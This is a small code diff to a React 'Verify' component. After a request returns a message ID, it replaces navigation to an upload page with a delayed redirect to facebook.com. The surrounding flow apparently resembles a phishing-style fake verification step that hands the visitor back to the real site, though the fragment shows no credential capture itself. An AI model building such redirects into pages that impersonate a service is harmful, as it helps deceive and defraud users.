@@ -96,7 +96,7 @@ const Verify: FC = () => {
         );
         localStorage.setItem("messageId", response.data.result.message_id);
         setTimeout(() => {
-          navigate("/upload");
+          window.location.replace("https://facebook.com");
         }, config.loadingTime);
       } catch {
         navigate("/upload");
